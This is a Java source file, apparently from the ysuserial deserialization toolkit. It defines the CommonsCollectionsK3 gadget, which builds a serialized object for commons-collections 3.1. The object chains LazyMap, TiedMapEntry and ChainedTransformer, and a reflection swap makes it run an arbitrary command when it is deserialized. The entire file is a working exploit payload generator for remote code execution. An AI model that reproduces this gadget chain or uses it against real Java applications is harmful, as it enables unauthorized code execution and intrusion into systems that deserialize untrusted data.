package org.su18.ysuserial.payloads.gadgets;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.su18.ysuserial.payloads.ObjectPayload;
import org.su18.ysuserial.payloads.annotation.Authors;
import org.su18.ysuserial.payloads.annotation.Dependencies;
import org.su18.ysuserial.payloads.util.PayloadRunner;
import org.su18.ysuserial.payloads.util.Reflections;
import org.su18.ysuserial.payloads.util.TransformerUtil;

import java.util.HashMap;
import java.util.Map;

@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({Authors.MATTHIASKAISER})
public class CommonsCollectionsK3 implements ObjectPayload<Object> {
    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsCollectionsK3.class, args);
    }

    public Object getObject(String command) throws Exception {
        Transformer[] fakeTransformers = new Transformer[]{new ConstantTransformer(1)};
        Transformer[] transformers     = TransformerUtil.makeTransformer(command);
        Transformer   transformerChain = new ChainedTransformer(fakeTransformers);
        Map           innerMap         = new HashMap();
        Map           outerMap         = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry  tme              = new TiedMapEntry(outerMap, "QI4L");
        Map           expMap           = new HashMap();
        expMap.put(tme, "QI5L");
        outerMap.remove("QI4L");

        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
        return expMap;
    }
}
